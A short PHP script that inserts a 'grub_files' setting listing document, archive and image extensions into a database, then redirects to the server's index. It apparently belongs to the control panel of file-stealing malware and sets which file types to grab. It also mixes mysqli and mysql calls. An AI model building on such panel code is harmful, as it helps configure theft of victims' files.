<?php

require("app/config.php");

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

$database->query("INSERT INTO `settings`(`Name`,`Value`) VALUES ('grub_files','txt;doc;docx;log;rar;zip;7z;jpeg;jpg;png;bmp;');");

mysql_close($database);

header( 'Location: http://'. $config["server_addr"] .'/index', true, 301 );

?>